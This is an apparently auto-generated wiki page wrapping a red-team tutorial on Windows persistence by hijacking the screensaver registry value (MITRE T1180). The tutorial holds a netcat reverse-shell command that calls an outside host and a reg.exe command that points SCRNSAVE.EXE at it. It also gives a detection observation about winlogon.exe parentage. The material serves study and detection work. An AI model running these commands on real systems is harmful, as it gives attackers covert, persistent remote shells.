---
parsed_by: focuslocust
source: redteamingtactics
type: generated
---
# Screensaver Hijack

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `redteamingtactics` |
| Type | `redteaming-topic` |
| Record ID | `rtt-offensive-security-persistence-t1180-screensaver-hijack` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/persistence/t1180-screensaver-hijack.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Screensaver Hijack](../../topics/offensive-security/screensaver-hijack.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | rtt-offensive-security-persistence-t1180-screensaver-hijack |
| name | Screensaver Hijack |
| type | redteaming-topic |
| source | redteamingtactics |
| url | https://github.com/mantvydasb/RedTeaming-Tactics-and-Techniques/blob/master/offensive-security/persistence/t1180-screensaver-hijack.md |

## Preserved Source Material

````yaml
_asset_filenames:
- screensaver-logs.png
- screensaver-reg.png
- screensaver-registry.png
- screensaver-shell (1).png
_body: '---

  description: Hijacking screensaver for persistence.

  ---


  # Screensaver Hijack


  ## Execution


  To achieve persistence, the attacker can modify `SCRNSAVE.EXE` value in the registry  `HKCU\Control Panel\Desktop\` and
  change its data to point to any malicious file.&#x20;


  In this test, I will use a netcat reverse shell as my malicious payload:


  {% code title="c:\shell.cmd@victim" %}

  ```csharp

  C:\tools\nc.exe 10.0.0.5 443 -e cmd.exe

  ```

  {% endcode %}


  Let''s update the registry:


  ![](../../.gitbook/assets/screensaver-registry.png)


  The same could be achieved using a native Windows binary reg.exe:


  {% code title="attacker@victim" %}

  ```bash

  reg add "hkcu\control panel\desktop" /v SCRNSAVE.EXE /d c:\shell.cmd

  ```

  {% endcode %}


  ![](../../.gitbook/assets/screensaver-reg.png)


  ## Observations


  Note the process ancestry on the victim system - the reverse shell process traces back to winlogon.exe as the parent process,
  which is responsible for managing user logons/logoffs. This is highly suspect and should warrant a further investigation:


  ![](<../../.gitbook/assets/screensaver-shell (1).png>)


  ![](../../.gitbook/assets/screensaver-logs.png)


  ## References


  {% embed url="https://attack.mitre.org/wiki/Technique/T1180" %}'
_relative_path: offensive-security/persistence/t1180-screensaver-hijack.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/persistence/t1180-screensaver-hijack.md
````
